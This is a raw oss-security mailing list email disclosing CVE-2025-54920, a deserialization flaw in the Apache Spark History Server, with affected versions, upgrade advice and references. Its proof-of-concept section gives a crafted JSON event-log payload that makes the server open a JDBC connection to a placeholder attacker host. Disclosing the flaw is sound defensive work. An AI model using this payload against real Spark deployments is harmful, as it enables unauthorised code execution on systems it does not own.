Received: (qmail 8074 invoked by uid 550); 13 Mar 2026 21:17:25 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 3897 invoked from network); 13 Mar 2026 21:16:01 -0000
Authentication-Results: apache.org; auth=none
Content-Type: text/plain; charset=utf-8
From: Holden Karau <holden@apache.org>
To: oss-security@lists.openwall.com
Message-ID: <aee6dd49-3908-5424-9761-a70d13d1ccee@apache.org>
Content-Transfer-Encoding: quoted-printable
Date: Fri, 13 Mar 2026 21:14:32 +0000
MIME-Version: 1.0
Subject: [oss-security] CVE-2025-54920: Apache Spark: Spark History Server Code Execution
 Vulnerability 

Severity: low=20

Affected versions:

- Apache Spark (org.apache.spark:spark-core_2.13, org.apache.spark:spark-co=
re_2.12) before 3.5.7
- Apache Spark (org.apache.spark:spark-core_2.13, org.apache.spark:spark-co=
re_2.12) 4.0.0 before 4.0.1

Description:

This issue affects Apache Spark: before 3.5.7 and 4.0.1. Users are recommen=
ded to upgrade to version 3.5.7 or 4.0.1 and above, which fixes the issue.





Summary

Apache Spark 3.5.4 and earlier versions contain a code execution vulnerabil=
ity in the Spark History Web UI due to overly permissive Jackson deserializ=
ation of event log data. This allows an attacker with access to the Spark e=
vent logs directory to inject malicious JSON payloads that trigger deserial=
ization of arbitrary classes, enabling command execution on the host runnin=
g the Spark History Server.





Details

The vulnerability arises because the Spark History Server uses Jackson poly=
morphic deserialization with @JsonTypeInfo.Id.CLASS on SparkListenerEvent o=
bjects, allowing an attacker to specify arbitrary class names in the event =
JSON. This behavior permits instantiating unintended classes, such as org.a=
pache.hive.jdbc.HiveConnection, which can perform network calls or other ma=
licious actions during deserialization.


The attacker can exploit this by injecting crafted JSON content into the Sp=
ark event log files, which the History Server then deserializes on startup =
or when loading event logs. For example, the attacker can force the History=
 Server to open a JDBC connection to a remote attacker-controlled server, d=
emonstrating remote command injection capability.






Proof of Concept:

1. Run Spark with event logging enabled, writing to a writable directory (s=
park-logs).

2. Inject the following JSON at the beginning of an event log file:


{

  "Event": "org.apache.hive.jdbc.HiveConnection",
  "uri": "jdbc:hive2://<IP>:<PORT>/",
  "info": {
    "hive.metastore.uris": "thrift://<IP>:<PORT>"
  }
}







3. Start the Spark History Server with logs pointing to the modified direct=
ory.

4. The Spark History Server initiates a JDBC connection to the attacker=E2=
=80=99s server, confirming the injection.










Impact

An attacker with write access to Spark event logs can execute arbitrary cod=
e on the server running the History Server, potentially compromising the en=
tire system.

This issue is being tracked as SPARK-52381=20

Credit:

Alexandre Pujol (Linagora) (finder)

References:

https://github.com/apache/spark/pull/51312
https://github.com/apache/spark/pull/51323
https://issues.apache.org/jira/browse/SPARK-52381
https://spark.apache.org/
https://www.cve.org/CVERecord?id=3DCVE-2025-54920
https://issues.apache.org/jira/browse/SPARK-52381

